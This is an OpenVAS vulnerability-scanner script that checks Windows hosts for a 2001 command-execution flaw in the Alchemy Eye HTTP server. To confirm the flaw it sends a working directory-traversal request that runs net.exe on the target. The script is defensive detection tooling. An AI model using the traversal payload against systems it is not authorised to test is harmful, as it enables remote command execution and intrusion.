###############################################################################
# OpenVAS Vulnerability Test
# $Id: alchemy_eye_http.nasl 5901 2017-04-09 13:17:48Z cfi $
#
# Description: Alchemy Eye HTTP Command Execution
#
# Authors:
# Drew Hintz ( http://guh.nu )
# Based on scripts written by Renaud Deraison and  HD Moore
#
# Copyright:
# Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10818");
  script_version("2019-04-10T13:42:28+0000");
  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3599);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2001-0871");
  script_name("Alchemy Eye HTTP Command Execution");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("www/alchemy");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/243404");

  script_tag(name:"summary", value:"Alchemy Eye and Alchemy Network Monitor are network management
  tools for Microsoft Windows. The product contains a built-in HTTP
  server for remote monitoring and control. This HTTP server allows
  arbitrary commands to be run on the server by a remote attacker.");

  script_tag(name:"solution", value:"Either disable HTTP access in Alchemy Eye, or require
  authentication for Alchemy Eye. Both of these can be set in the Alchemy Eye preferences.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

foreach dir( make_list( "/PRN", "/NUL", "" ) ) {

  url = string("/cgi-bin", dir, "/../../../../../../../../WINNT/system32/net.exe");

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );
  if(!res)
    continue;

  if( "ACCOUNTS | COMPUTER" >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );